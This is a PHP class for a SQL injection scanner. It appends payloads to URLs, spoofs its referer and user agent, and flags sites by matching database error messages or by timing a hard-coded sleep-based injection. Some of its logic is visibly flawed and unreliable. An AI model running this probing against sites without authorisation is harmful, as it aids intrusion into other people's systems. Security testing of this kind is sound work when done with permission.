<?php
    require_once 'CrawlClass.php';

    class SqliScanner {
        private $url = '';
        private $type = '';
        private $method = '';
        private $text = '';
        private $payload;
        private $start;
        private $end;
        private $opt;
        private $res;
        private $conn;
        private $inband;
        private $blind;

        function __construct() {
        }

        private function make_inband_get_request(){
            $this->conn = curl_init($this->url);
            curl_setopt($this->conn, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($this->conn, CURLOPT_TIMEOUT, 200);
            curl_setopt($this->conn, CURLOPT_HEADER, 1);
            curl_setopt($this->conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($this->conn, CURLOPT_REFERER, "http://google.com");
            curl_setopt($this->conn, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9');
            $this->res = curl_exec($this->conn);
        }

        private function make_inband_post_request(){
            $this->conn = curl_init($this->url);
            curl_setopt($this->conn, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($this->conn, CURLOPT_TIMEOUT, 200);
            curl_setopt($this->conn, CURLOPT_HEADER, 1);
            curl_setopt($this->conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($this->conn, CURLOPT_REFERER, "http://google.com");
            curl_setopt($this->conn, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9');
            curl_setopt($this->conn, CURLOPT_POST, 1);
            curl_setopt($this->conn, CURLOPT_POSTFIELDS, $this->opt);
            $this->res = curl_exec($this->conn);
        }

        private function make_blind_get_request(){
            $this->start = time();
            $this->conn = curl_init($this->url);
            curl_setopt($this->conn, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($this->conn, CURLOPT_TIMEOUT, 200);
            curl_setopt($this->conn, CURLOPT_HEADER, 1);
            curl_setopt($this->conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($this->conn, CURLOPT_REFERER, "http://google.com");
            curl_setopt($this->conn, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9');
            $this->res = curl_exec($this->conn);
        }

        private function make_blind_post_request(){
            $this->start = time();
            $this->conn = curl_init($this->url);
            curl_setopt($this->conn, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($this->conn, CURLOPT_TIMEOUT, 200);
            curl_setopt($this->conn, CURLOPT_HEADER, 1);
            curl_setopt($this->conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($this->conn, CURLOPT_REFERER, "http://google.com");
            curl_setopt($this->conn, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9');
            curl_setopt($this->conn, CURLOPT_POST, 1);
            curl_setopt($this->conn, CURLOPT_POSTFIELDS, "id=%27-sleep%285%29%23#");
            $this->res = curl_exec($this->conn);
        }

        public function setPayload($payload){
            $this->payload = $payload;
        }

        private $sql_error = array(
            'You have an error in your SQL',
            'Division by zero in',
            'supplied argument is not a valid MySQL result resource in',
            'Call to a member function',
            'Microsoft JET Database','ODBC Microsoft Access Driver',
            'Microsoft OLE DB Provider for SQL Server',
            'Unclosed quotation mark',
            'Microsoft OLE DB Provider for Oracle',
            '[Macromedia][SQLServer JDBC Driver][SQLServer]Incorrect',
            'Incorrect syntax near',
            'you have an error in your sql syntax;',
            'warning: mysql',
            'unclosed quotation mark after the character string',
            'quoted string not properly terminated'
        );

        public function setUrl($url){
            $this->url = $url;
        }

        public function setType($type){
            $this->type = $type;
        }

        public function setMethod($method){
            $this->method = $method;
        }

        public function setOption($opt){
            $this->opt = $opt;
        }

        public function execute(){
            if(strtolower($this->type) == 'inband'){
                if(strtolower($this->method) == 'get'){
                    echo "[-] Tes inband injection ( GET Method )\n";
                    $this->url .= $this->payload;;
                    $this->make_inband_get_request();
                    if($this->res){
                    foreach($this->sql_error as $error) {
                        $e = strtolower($error);
                        if(preg_match("/$e/", strtolower($this->res))) {
                            $this->text =  "[+] SQL Injection vulnerable detected : $this->url\n\n";
                        }else{
                        }
                    }
                        print $this->text;
                    } else {
                        print false;
                    }

                    if($this->text == ''){
                        $this->text =  "[+] SQL Injection vulnerable not detected : $this->url\n\n";
                        print $this->text;
                    }
                }else{
                    $this->make_inband_post_request();
                    echo "[-] Tes inband injection ( POST Method )\n";
                    if($this->res){
                    foreach($this->sql_error as $error) {
                        $e = strtolower($error);
                        if(preg_match("/$e/", strtolower($this->res))) {
                            $this->text =  "[+] SQL Injection vulnerable detected : $this->url\n\n";
                        }else{
                        }
                    }
                        print $this->text;
                    } else {
                        print false;
                    }

                    if($this->text == ''){
                        $this->text =  "[+] SQL Injection vulnerable not detected : $this->url\n\n";
                        print $this->text;
                    }
                }
            }else{
                if(strtolower($this->method) == 'get'){
                    echo "[-] Tes blind injection ( GET Method )\n";
                    $this->url .= $this->payload;
                    $this->make_blind_get_request();
                    if($this->res){
                        $this->end = time();
                        if($this->end - $this->start > 9){
                            $this->text =  "[+] SQL Injection vulnerable detected : $this->url\n\n";
                        }
                        print $this->text;
                    }

                    if($this->text == ''){
                        $this->text =  "[+] SQL Injection vulnerable not detected : $this->url\n\n";
                        print $this->text;
                    }
                }else{
                    $this->make_blind_post_request();
                    echo "[-] Tes blind injection ( POST Method )\n";
                    if($this->res){
                        $this->end = time();
                        if($this->end - $this->start > 9){
                            $this->text =  "[+] SQL Injection vulnerable detected : $this->url\n\n";
                        }
                        print $this->text;
                    } else {
                        print false;
                    }

                    if($this->text == ''){
                        $this->text =  "[+] SQL Injection vulnerable not detected : $this->url\n\n";
                        print $this->text;
                    }
                }

            }         
        }
    }
